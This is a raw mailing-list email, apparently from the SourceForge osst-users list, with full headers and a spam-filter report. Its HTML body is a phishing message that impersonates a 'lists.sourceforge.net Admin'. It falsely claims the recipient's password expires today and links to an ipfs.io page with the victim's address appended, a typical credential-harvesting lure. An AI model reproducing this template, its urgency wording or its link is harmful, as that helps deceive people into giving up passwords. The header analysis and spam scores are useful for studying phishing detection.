Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 48B9FAB260C
	for <lists+osst-users@lfdr.de>; Sun, 11 May 2025 03:47:27 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=W9t8TC3rUw3hr/8n4QLh5JFs8Wd44v6IXp9W+kZnM+E=; b=CKLPuQaJgLUCJFjBofFV2LlNgz
	kI21LENsloKhdzj98exrBYou8AWQinJPIeTyHHZT02+xKGetaBCuvioQTuUWCt/tw+7UAVInFpb/i
	kivSutpVjMMZqYs6vUWLe6+QUAwecFVw9Gd3dHFNc/SenjJHaEyVRf//SP5kxXUwd448=;
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uDvmn-0004VF-O3
	for lists+osst-users@lfdr.de;
	Sun, 11 May 2025 01:47:25 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admin@newhomeinturkey.de>) id 1uDvmh-0004V5-2c
 for osst-users@lists.sourceforge.net; Sun, 11 May 2025 01:47:19 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=+4B1ErIrYgeOpRQGcq4tpLqAZsKQQq0OBNDOgMBHu8Q=; b=mMbG1EqsKF6YT9Z1UYkMJDiCK2
 1YTuWM/6AvtiQfR9BvflDgs9+U4nNxLJiUQuDwEGtgeHh73Alm7AJVHotOsCNbFNEhNnLD695Y/fw
 5flNhBgBaQMZ6Bh9hHJyrQPApfOvsayWAo6dikxH/1pq2/4TDCBfcQxkg5kGbM/6YN9A=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=+4B1ErIrYgeOpRQGcq4tpLqAZsKQQq0OBNDOgMBHu8Q=; b=J
 aa5jnJ3zzU2SvUp2x/XQIcxwqjtz5JJ09nKUct8pEEcLQrryqYtqJNTBpj9qBUreGV0aJmA9DoVRv
 vSZdfWGEx6ApZoHMwh2/Bo/2Kyl89cSdiIii5TgdPsQIQ5T7eJtUalb6kxjOUZqU7hjTM7WtF5hhh
 u+7/vnK+NhjBrtxg=;
Received: from [85.121.148.20] (helo=raew9Ppa.ava.hosting)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1uDvmg-0007Hd-9N for osst-users@lists.sourceforge.net;
 Sun, 11 May 2025 01:47:19 +0000
Received: from newhomeinturkey.de (raew9Ppa.ava.hosting [IPv6:::1])
 by raew9Ppa.ava.hosting (Postfix) with ESMTP id 3AFF626C2E
 for <osst-users@lists.sourceforge.net>; Sun, 11 May 2025 04:46:24 +0300 (EEST)
From: lists.sourceforge.net Admin <admin@newhomeinturkey.de>
To: osst-users@lists.sourceforge.net
Date: 11 May 2025 01:46:22 -0700
Message-ID: <20250511014617.1E7B58053DBD884E@newhomeinturkey.de>
MIME-Version: 1.0
X-Spam-Score: 6.9 (++++++)
X-Spam-Report: Spam detection software, running on the system "6901ab67b84d", 
 has identified this incoming email as possible spam. The
 original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Account Security Check Dear osst-users@lists.sourceforge.net
 Content analysis details:   (6.9 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [85.121.148.20 listed in zen.spamhaus.org]
 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
 blocklist [URI: ipfs.io/209.94.90.1]
 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
 1.4 DEAR_EMAIL             BODY: Message contains Dear email address
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or identical to
 background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
 0.0 GOOG_REDIR_HTML_ONLY   Google redirect to obscure spamvertised website
 + HTML only
 0.4 URI_IPFSIO References Interplanetary File System PtP content via
 ipfs.io, likely phishing
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML only
 0.0 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised website +
 no rDNS
 0.0 URI_IPFS               References Interplanetary File System PtP content,
 probable phishing
X-Headers-End: 1uDvmg-0007Hd-9N
Subject: [Osst-users] osst-users@lists.sourceforge.net Account security check
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============7015799950218843214=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============7015799950218843214==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body>
<DIV aria-expanded=3Dfalse spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 a=
ria-label=3D"Message Body" aria-multiline=3Dtrue aria-controls=3D:945 id=3D=
:pg class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" hideFocus contentEditab=
le=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT: 230px" aria-owns=3D:945 itac=
orner=3D"6,7:1,1,0,0" g_editable=3D"true" writingsuggestions=3D"false">
<DIV dir=3Dltr>
<DIV dir=3Dltr><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto,sans-ser=
if; COLOR: rgb(44,54,58)">&nbsp;</SPAN>
<table style=3D"FONT-SIZE: 15px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
ONT-FAMILY: Helvetica,Arial,Tahoma,Verdana,sans-serif; BORDER-RIGHT: rgb(21=
1,211,211) 1px dotted; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,21=
1,211) 1px dotted; COLOR: rgb(44,54,58); BORDER-LEFT: rgb(211,211,211) 1px =
dotted; LINE-HEIGHT: 1.2; TEXT-INDENT: 0px" cellspacing=3D"0" cellpadding=
=3D"0" width=3D"520" align=3D"center" border=3D"1">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box; MIN-HEIGHT: 90px">
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
MIN-HEIGHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted" height=3D"90">
<table style=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
ONT-FAMILY: Arial,Helvetica; BORDER-RIGHT: rgb(211,211,211) 1px dotted; BOR=
DER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; MIN-HEI=
GHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted; LINE-HEIGHT: 1.2" cell=
spacing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=3D"#0078d7" border=
=3D"1">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box; MIN-HEIGHT: 90px">
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
MIN-HEIGHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted" bgcolor=3D"#007=
8d7" height=3D"90">
<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 18px; FONT-FAMILY: "UI WP =
Helvetica",Arial,serif,EmojiFont; COLOR: rgb(255,255,255); PADDING-BOTTOM: =
0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 30px; PADDING-RIGHT: =
0px'>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 28px; PADDING-BOTTOM: 0px;=
 PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 10px; PADDING-RIG=
HT: 0px">Account Security Check</DIV></DIV></TD></TR></TBODY></TABLE></TD><=
/TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
BORDER-LEFT: rgb(211,211,211) 1px dotted">
<DIV style=3D'BOX-SIZING: border-box; FONT-FAMILY: Segoe,Tahoma,"Sans Verda=
na",sans-serif,serif,EmojiFont; COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; =
DIRECTION: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 12=
0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px'>
<DIV style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px=
; PADDING-LEFT: 0px; MARGIN: 20px 120px 30px 0px; LINE-HEIGHT: 20px; PADDIN=
G-RIGHT: 0px">&nbsp;</DIV>
<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 17px; FONT-FAMILY: "UI WP =
Segoe",Tahoma,"Sans Verdana",sans-serif,serif,EmojiFont; COLOR: rgb(0,120,2=
15); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px =
0px 10px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px'><FONT style=3D"BOX-SIZING:=
 border-box" color=3D#000000 size=3D3 face=3D"Times New Roman">Dear&nbsp; o=
sst-users@lists.sourceforge.net</FONT></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; COLOR: rgb(102,102,1=
02); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px =
120px 30px 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px"><FONT style=3D"BOX-S=
IZING: border-box" color=3D#000000 size=3D3 face=3D"Times New Roman">Your p=
assword osst-users@lists.sourceforge.net expires today</FONT><BR style=3D"B=
OX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">
<A style=3D"BOX-SIZING: border-box; BACKGROUND-IMAGE: none; BACKGROUND-REPE=
AT: repeat; COLOR: white; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LE=
FT: 5px; DISPLAY: block; PADDING-RIGHT: 5px; BACKGROUND-COLOR: rgb(0,120,21=
5); text-decoration-line: none; background-size: auto" href=3D"https://ipfs=
=2Eio/ipfs/bafybeichgrzfhfc5wyunli4vwxtjglb7qrwpr46th4xwgtclswykreuvgu/chia=
ds.html#osst-users@lists.sourceforge.net" rel=3Dnoreferrer target=3D_blank=
=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ipfs.io/ipfs=
/bafybeicieuwoijjzsnnkco47ihshbau2l5zr23f3kdrmelkwbnm4qx5qqm/indesx.html%23=
%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1747004530057000&amp;usg=
=3DAOvVaw3sIeP7rZV29jTTjDxJnKko">Click here to keep your password</A><BR st=
yle=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><FONT s=
tyle=3D"BOX-SIZING: border-box" color=3D#000000 size=3D3 face=3D"Times New =
Roman"><SPAN style=3D"BOX-SIZING: border-box; TEXT-ALIGN: right">
&copy; 2025 </SPAN></FONT>Message Center Admin Support</DIV></DIV></TD></TR=
></TBODY></TABLE></DIV></DIV></DIV></BODY></HTML>


--===============7015799950218843214==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7015799950218843214==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============7015799950218843214==--
